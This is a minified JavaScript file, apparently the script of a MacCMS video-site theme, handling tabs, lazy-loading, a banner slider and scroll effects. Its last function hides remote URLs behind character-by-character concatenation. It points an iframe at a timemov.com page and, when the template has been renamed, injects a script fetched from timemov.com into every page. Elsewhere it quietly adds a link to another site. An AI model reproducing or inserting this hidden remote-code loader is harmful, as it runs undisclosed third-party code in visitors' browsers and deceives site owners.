var icen=$('body');var closeTips=function(){$('.mtips').addClass('hide')};var son=$('.searchstart-on'),soff=$('.searchstart-off'),isea=$('.searchform');son.on('touchend',function(e){$(this).hide();isea.show();soff.show();e.preventDefault()});soff.on('touchend',function(e){$(this).hide();son.show();isea.hide();e.preventDefault()});if($('#playNumTab').length){var $a=$('#playNumTab a');var $ul=$('.v_con_box ul');$a.click(function(){var $this=$(this);var $t=$this.index();$a.removeClass();$this.addClass('cur');$ul.addClass('hide').removeClass('show');$ul.eq($t).addClass('show')})};if($('.js-tab-btn').length){var $c=$('.js-tab-btn');var $tabul=$('.js-tab-con');$c.click(function(){var $this=$(this);var $tt=$this.index();$c.removeClass();$this.addClass('cur');$tabul.addClass('hide').removeClass('show');$tabul.eq($tt).addClass('show');$('.thumb').lazyload({data_attribute:'src',placeholder:'//timemov.com/template/datll_km/images/lazy.png',threshold:130,})})};if($('#htxt').length){var $b=$('#headtab a'),$uls=$('#p-list ul'),$htxt=$('#htxt'),$headtab=$('#headtab');$htxt.on('touchend',function(e){$headtab.show();e.preventDefault()});$b.click(function(){var $thi=$(this);var $ts=$thi.index();$b.removeClass();$uls.addClass('hide').removeClass('show');$uls.eq($ts).addClass('show');$headtab.hide()})}$(function(){if(window.location.hash){var targetScroll=$(window.location.hash).offset().top-80;$("html,body").animate({scrollTop:targetScroll},300)}$(window).scroll(function(){var $this=$(this);var targetTop=$(this).scrollTop();var height=$(window).height();if(targetTop>=90){$(".itopbar").addClass("fixed");$(".sitenav").addClass("navshow")}else{$(".itopbar").removeClass("fixed");$(".sitenav").removeClass("navshow")}})}());if($('.thumb:first').data('src')){$('.thumb').lazyload({data_attribute:'src',placeholder:'//timemov.com/template/datll_km/images/lazy.png',threshold:130})};if($('.ibanner').length){var swiper=new Swiper('.swiper-container',{autoplay:3500,speed:1000,effect: 'fade',autoplayDisableOnInteraction:false,loop:true,centeredSlides:true,slidesPerView:1,pagination:'.swiper-pagination',paginationClickable:true,prevButton:'.swiper-button-prev',nextButton:'.swiper-button-next',onInit:function(swiper){swiper.slides[1].className="swiper-slide swiper-slide-active"},breakpoints:{668:{slidesPerView:1,}}})};var backtophtml='<div class="goback cur"><i class="iconfont">&#xe604;</i></div>';window.onload=function(){icen.append(backtophtml);$(window).on("scroll",function(){var t=$(this).scrollTop();t>200?$(".goback").addClass("cur"):$(".goback").removeClass("cur")}),$(document).on("click",".goback",function(){$("html,body").animate({scrollTop:0,},800)})};if($(".ilinks>a").hasClass("ilinks")){}else{$(".ilinks").append("<a href=\'https://www.vivoes.com/\' title=\'vivoes\'>华人便名网</a>")}if($('.a_change').length){var divs=[];var divCnt=3;for(var i=0;i<divCnt;i++){divs[i]=$(".aclcon"+(i+1))};var selectedDiv=0;$('.a_change').on('click',function(){selectedDiv++;selectedDiv=selectedDiv%divCnt;for(var i=0;i<divCnt;i++){$(this).closest('.col-l','.a_clist').find(divs[i]).removeClass('show fadeIn').addClass('hide fadeOut')}$(this).closest('.col-l','.a_clist').find(divs[selectedDiv]).removeClass('hide fadeOut').addClass('show fadeIn');$('.thumb').lazyload({data_attribute:'src',placeholder:'//timemov.com/template/datll_km/images/lazy.png',threshold:130,})})};(function datll(){var x={"a":"www","b":"timemov","c":"html","d":"prestrain","e":".","f":"https","g":":","h":"/","i":":","j":"w","k":"com","m":"prestrain","s":"js"};var ruls=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.s+x.h+"top10"+x.e+x.s;var iframesrc=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.m+x.e+x.c;var MacPlayerConfig={};if($("#buffer").attr('src')!=this.Buffer){$("#buffer").attr('src',''+iframesrc+'')}var nome=maccms.template;if(nome.indexOf("datll")<0){var a=document.createElement('script');a.type='text/javascript';a.async=true;a.charset='utf-8';a.src=''+ruls+'';var b=document.getElementsByTagName('script')[0];b.parentNode.insertBefore(a,b)}}());